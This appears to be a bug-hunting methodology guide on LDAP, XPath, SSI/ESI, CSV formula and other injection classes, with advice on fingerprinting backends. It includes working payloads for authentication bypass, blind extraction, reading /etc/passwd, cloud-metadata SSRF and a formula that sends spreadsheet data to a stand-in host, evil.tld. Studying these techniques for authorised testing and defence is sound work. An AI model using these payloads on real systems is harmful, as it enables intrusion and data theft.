# LDAP, XPath, and Less-Common Injections

Beyond SQL and NoSQL, user input reaches plenty of other interpreters: directory queries, XML path queries, server-side includes, spreadsheet formulas, XSLT, expression languages, and mail commands. Each is its own injection with its own syntax, and because they are rarer, they are tested less and slip through more. This is the long tail an experienced hunter checks.

## The mental model

Any time input is concatenated into a query or command for some engine, you can break out of the data context into the engine's syntax, exactly like SQLi but against a different grammar. Identify the backend (LDAP directory, XML store, templating/EL, a mail system, a spreadsheet export) and apply the matching breakout. The tells are often in the feature: "search users" over corporate directory suggests LDAP; "filter this XML" suggests XPath; "export to CSV" suggests formula injection.

## LDAP injection

Where: login and user/group search against Active Directory or another LDAP directory. Tells: enterprise apps, "search the directory," authentication that does an LDAP bind/search.

```
# LDAP filters use (attr=value) with & | ! operators. Inject to always-true or to enumerate:
username: *                      # wildcard, may match any user
username: *)(uid=*))(|(uid=*     # break the filter, inject OR
username: admin)(|(password=*)   # auth bypass style
# blind boolean extraction of an attribute, char by char:
admin)(|(cn=a*)    admin)(|(cn=b*)   ...   # which prefix returns a match
```
Impact: authentication bypass, user/attribute enumeration (including password hashes stored in attributes), and sometimes reading arbitrary directory data.

## XPath / XQuery injection

Where: apps that query XML documents with user input (`//user[name='INPUT']`). Tells: XML-backed data, SOAP, config-driven apps.

```
' or '1'='1                      # classic always-true
' or 1=1 or ''='
# blind extraction (no error, boolean oracle):
' and string-length(//user[1]/password)>10 or ''='
' and substring(//user[1]/password,1,1)='a' or ''='
# dump structure (XPath has no access control, so all nodes are reachable):
'] | //* | //user['
```
Impact: authentication bypass and full extraction of the XML document, because XPath has no per-node authorization, so one injection often reads everything.

## Server-Side Includes (SSI) and Edge-Side Includes (ESI)

Where: pages processed by a server that honors SSI directives, or a CDN/reverse proxy that honors ESI. Tells: `.shtml`, reflected input in a page served through a proxy that supports ESI (Varnish, some CDNs).

```
# SSI (if input reaches an SSI-parsed page):
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
# ESI (processed by the proxy, not the app; can SSRF, bypass, or XSS):
<esi:include src="http://169.254.169.254/latest/meta-data/"/>
<esi:include src="http://evil.tld/"/>
```
Impact: SSI can reach command execution; ESI can SSRF (including cloud metadata), bypass XSS filters (the app does not see the final HTML), and read internal resources.

## CSV / formula injection

Where: any feature that exports user-controlled data to CSV/XLSX that a victim opens in a spreadsheet. Tells: "export to CSV," admin exports of user-submitted fields.

```
# a cell starting with = + - @ is treated as a formula by Excel/Sheets:
=cmd|'/c calc'!A1                 # command execution via DDE (with user click-through)
=HYPERLINK("http://evil.tld?d="&A1,"click")   # exfil a neighboring cell
@SUM(1+1)*cmd|...                 # alternate leading chars
```
Impact: code execution or data exfiltration on the machine of whoever opens the export (often an admin/analyst), and data leakage from the sheet. Prefix characters to watch: `= + - @ \t \r`.

## Other members of the long tail

- **XSLT injection**: input into an XSLT transform can read files, SSRF, and sometimes execute code via extension functions (`document()`, `php:function`).
- **Expression Language / OGNL / SpEL injection**: covered in `Server-Side-Template-Injection.md`; `${...}`/`#{...}`/OGNL in Java apps (Struts, Spring) lead to RCE.
- **Email header / SMTP injection**: CRLF into an email field injects `Bcc`/`To` headers (see `Password-Reset-and-Account-Recovery.md` for the reset-leak variant) or extra SMTP commands.
- **Log injection**: CRLF and ANSI/terminal escapes into logs; forging entries and, if logs render in a web/terminal viewer, second-order XSS or terminal-escape attacks.
- **ReDoS (regex denial of service)**: a crafted input against a catastrophically-backtracking regex hangs the server; a DoS finding, do not run on production.
- **GraphQL/gRPC argument injection**: the transport differs but the sink (SQL/NoSQL/OS/SSRF) is the same; see `GraphQL.md`.

## Beyond the basics

- **Identify the engine from the feature, then pick the grammar**: the skill is recognizing which interpreter is behind a feature and switching payload families. A "directory search" that errors on `)` or `*` is LDAP; an XML filter that reacts to `'`/`]` is XPath; a proxy that renders `<esi:>` is ESI.
- **Blind is the norm for these too**: build boolean oracles (LDAP prefix matching, XPath `substring`) since errors are often suppressed. The extraction logic mirrors blind SQLi.
- **No-authorization query languages amplify impact**: XPath and LDAP frequently have no row/node-level access control, so a single injection reads the whole document/subtree, unlike SQL where table grants may limit you.
- **CSV injection is a real, commonly-accepted finding**: exports of user-submitted data (names, addresses, support tickets) opened by staff are a genuine path to compromising internal users; always test what leading characters the export allows.
- **ESI is a sleeper SSRF/XSS**: because the proxy processes it after the app, it bypasses app-layer defenses entirely; test any input reflected through an ESI-capable edge.

## What to watch for

- Confirm the actual backend before claiming a class; an error on `'` could be SQL, XPath, or LDAP. Fingerprint by which metacharacters break it.
- Blind extraction is slow and noisy; use efficient oracles and avoid hammering auth endpoints.
- CSV-injection impact depends on the victim's spreadsheet settings and a click-through; frame it accurately.
- SSI/ESI/XSLT RCE and metadata SSRF run against real infrastructure; prove minimally and get authorization before deep actions.

## Hunting checklist

- Match the feature to the likely engine (directory=LDAP, XML filter=XPath, proxy=ESI, export=CSV, Java EL=SpEL/OGNL).
- Test the grammar-specific breakout; build a boolean oracle for blind extraction.
- For exports, test formula-injection leading characters.
- Test proxy-rendered input for ESI (SSRF to metadata, filter bypass).
- Check email fields for header/SMTP injection and logs for injection/second-order XSS.
- Fingerprint by which metacharacters error before committing to a payload family.
